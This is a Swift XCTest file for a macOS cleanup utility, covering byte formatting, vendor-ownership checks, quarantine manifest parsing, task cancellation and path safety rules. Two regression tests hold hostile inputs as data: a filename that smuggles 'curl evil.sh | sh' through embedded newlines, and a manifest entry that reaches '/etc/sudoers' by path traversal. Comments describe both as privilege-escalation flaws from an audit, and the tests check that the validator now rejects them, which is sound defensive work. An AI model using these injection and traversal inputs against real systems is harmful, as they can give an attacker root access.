import XCTest

// MARK: - 1.0.1 behaviour

/// Tests for the accuracy and presentation work added in 1.0.1. Each one
/// pins a behaviour that was wrong, missing, or unverifiable in 1.0.0.
final class ImprovementTests: XCTestCase {

    // MARK: Byte formatting

    /// "Zero KB" is `ByteCountFormatter`'s wording and reads as a bug in a
    /// column of sizes.
    func testZeroRendersAsZeroKB() {
        XCTAssertEqual(SWPBytes.string(0), "0 KB")
        XCTAssertEqual(SWPBytes.string(-1), "0 KB")
    }

    // MARK: Live identifiers

    /// A package receipt or a loaded launchd job keeps a vendor alive even
    /// when no `.app` exists — the Paragon/Razer shape. Without this, driver
    /// vendors read as orphaned.
    func testReceiptAndDaemonIdentifiersKeepVendorsAlive() {
        let inventory = SWPAppInventory.fixture(
            bundleIDs: Set((0..<40).map { "com.filler.app\($0)" }),
            liveIdentifiers: ["com.paragon-software.ntfs",
                              "com.crystalidea.macsfancontrol.smcwrite"],
            appCount: 60)

        XCTAssertTrue(inventory.owns("com.paragon-software.ntfs"))
        XCTAssertTrue(inventory.owns("com.paragon-software.ntfs.notification-agent"),
                      "a helper under a live vendor prefix must count as owned")
        XCTAssertTrue(inventory.owns("com.crystalidea.macsfancontrol"))
        XCTAssertFalse(inventory.owns("com.vanished.tool"))
    }

    /// Live identifiers are a *keep* signal only: they must never make an
    /// unrelated vendor look installed.
    func testLiveIdentifiersDoNotOverReach() {
        let inventory = SWPAppInventory.fixture(
            bundleIDs: Set((0..<40).map { "com.filler.app\($0)" }),
            liveIdentifiers: ["com.acme.driver"],
            appCount: 60)
        XCTAssertFalse(inventory.owns("com.acmecorp.other"))
        XCTAssertFalse(inventory.owns("com.other.acme"))
    }

    // MARK: Quarantine manifest

    /// The manifest is what makes an authorised removal reversible; parsing it
    /// must survive paths containing spaces.
    func testManifestRoundTrip() throws {
        let folder = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("swp-manifest-test-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }

        let quarantined = folder.appendingPathComponent("Some Daemon.plist")
        try Data().write(to: quarantined)
        let manifest = folder.appendingPathComponent(SWPRemovalService.manifestName)
        try("# header\nSome Daemon.plist\t/Library/LaunchDaemons/Some Daemon.plist\n"
            + "Missing.plist\t/Library/LaunchDaemons/Missing.plist\n")
            .write(to: manifest, atomically: true, encoding: .utf8)

        let entries = SWPRemovalService.entries(in: folder)
        XCTAssertEqual(entries.count, 1, "entries whose quarantined file is gone are skipped")
        XCTAssertEqual(entries.first?.original.path,
                       "/Library/LaunchDaemons/Some Daemon.plist")
    }

    // MARK: Cancellation

    /// The bug this pins: `Task.detached` does not inherit cancellation, so a
    /// scanner's `Task.isCancelled` checks are dead unless the detached child
    /// is cancelled explicitly. This asserts the bridge works — cancel the
    /// outer task, and work inside the detached child observes it.
    func testDetachedWorkObservesOuterCancellation() async {
        let observed = SWPCancellationProbe()

        let outer = Task {
            let work = Task.detached { () -> Bool in
                // Spin until cancelled, exactly like a directory walk.
                for _ in 0..<2_000 {
                    if Task.isCancelled { return true }
                    try? await Task.sleep(nanoseconds: 1_000_000)
                }
                return false
            }
            let sawCancellation = await withTaskCancellationHandler {
                await work.value
            } onCancel: {
                work.cancel()
            }
            await observed.set(sawCancellation)
        }

        try? await Task.sleep(nanoseconds: 50_000_000)
        outer.cancel()
        _ = await outer.value

        let sawCancellation = await observed.value
        XCTAssertTrue(sawCancellation,
                      "detached work must observe cancellation forwarded by the handler")
    }

    /// Control: without the handler the detached child never sees it. If this
    /// ever starts failing, Swift changed and the bridge may be removable.
    func testDetachedWorkIgnoresCancellationWithoutTheBridge() async {
        let observed = SWPCancellationProbe()

        let outer = Task {
            let work = Task.detached { () -> Bool in
                for _ in 0..<120 {
                    if Task.isCancelled { return true }
                    try? await Task.sleep(nanoseconds: 1_000_000)
                }
                return false
            }
            await observed.set(await work.value)
        }

        try? await Task.sleep(nanoseconds: 20_000_000)
        outer.cancel()
        _ = await outer.value

        let sawCancellation = await observed.value
        XCTAssertFalse(sawCancellation,
                       "detached tasks do not inherit cancellation — this is why the bridge exists")
    }

    // MARK: Running processes

    /// The third keep-signal: a running process proves its app is installed.
    func testRunningBundleIDsCountAsLiveIdentifiers() {
        let inventory = SWPAppInventory.fixture(
            bundleIDs: Set((0..<40).map { "com.filler.app\($0)" }),
            liveIdentifiers: ["com.running.app"],
            appCount: 60)
        XCTAssertTrue(inventory.owns("com.running.app"))
        XCTAssertTrue(inventory.owns("com.running.app.helper"))
    }

    // MARK: Control characters

    /// The audit found a working root-command injection: a filename containing
    /// a newline broke out of the manifest heredoc in the script that runs
    /// under `with administrator privileges`, and `/Library/Caches` is
    /// world-writable so planting one needed no privileges. The manifest no
    /// longer goes through that script at all, and the policy also refuses
    /// control characters outright — this pins the second line of defence.
    func testControlCharactersInPathsAreRefused() {
        let caches = URL(fileURLWithPath: NSHomeDirectory())
            .appendingPathComponent("Library/Caches")
        // NUL is deliberately absent: it terminates a C string, so no real
        // file can carry it, and Foundation percent-encodes it into the inert
        // literal "%00" before the policy ever sees it.
        for name in ["Evil\nSWPMANIFEST\ncurl evil.sh | sh",
                     "tab\tseparated",
                     "carriage\rreturn",
                     "vertical\u{0B}tab"] {
            let url = caches.appendingPathComponent(name)
            XCTAssertFalse(SWPSafety.validate(url).isAllowed,
                           "must refuse a path containing control characters")
        }
        // A perfectly ordinary name with spaces and unicode stays allowed.
        XCTAssertTrue(SWPSafety.validate(
            caches.appendingPathComponent("Some Vendor — café")).isAllowed)
    }

    // MARK: Quarantine manifest source validation

    /// The audit found a local privilege escalation: `restore()` validated the
    /// manifest's DESTINATION but not its SOURCE, so a crafted manifest naming
    /// `../../../../etc/sudoers` had the authorised batch `mv` that file as
    /// root. The source must be a single file name inside the folder.
    func testManifestSourceEscapesAreRejected() throws {
        let folder = URL(fileURLWithPath: NSTemporaryDirectory())
            .appendingPathComponent("swp-escape-\(UUID().uuidString)")
        try FileManager.default.createDirectory(at: folder, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: folder) }

        let legit = folder.appendingPathComponent("real.plist")
        try Data().write(to: legit)

        let manifest = folder.appendingPathComponent(SWPRemovalService.manifestName)
        try("""
        # header
        ../../../../../../../../etc/sudoers\t/Users/x/Library/Caches/a
        sub/dir/file\t/Users/x/Library/Caches/b
        ..\t/Users/x/Library/Caches/c
        real.plist\t/Users/x/Library/Caches/real.plist
        """).write(to: manifest, atomically: true, encoding: .utf8)

        let entries = SWPRemovalService.entries(in: folder)
        XCTAssertEqual(entries.count, 1, "only the in-folder entry may survive")
        XCTAssertEqual(entries.first?.quarantined.lastPathComponent, "real.plist")
    }

    // MARK: Policy for the new developer sources

    /// The dot-roots must sit one level above what the scanners offer, or the
    /// "never remove a root itself" rule silently drops these targets.
    func testDeveloperCachePathsAreRemovableButTheirRootsAreNot() {
        let home = URL(fileURLWithPath: NSHomeDirectory())
        for path in [".gradle/caches", ".npm/_cacache",
                     "Library/Developer/Xcode/UserData/Previews",
                     "Library/Caches/CocoaPods"] {
            XCTAssertTrue(SWPSafety.validate(home.appendingPathComponent(path)).isAllowed,
                          "must allow ~/\(path)")
        }
        for root in [".gradle", ".npm"] {
            XCTAssertFalse(SWPSafety.validate(home.appendingPathComponent(root)).isAllowed,
                           "must refuse the root ~/\(root)")
        }
    }
}

// MARK: - Probe

/// Actor box so the async cancellation tests can record a result without
/// tripping over concurrent access.
private actor SWPCancellationProbe {
    private(set) var value = false
    func set(_ newValue: Bool) { value = newValue }
}
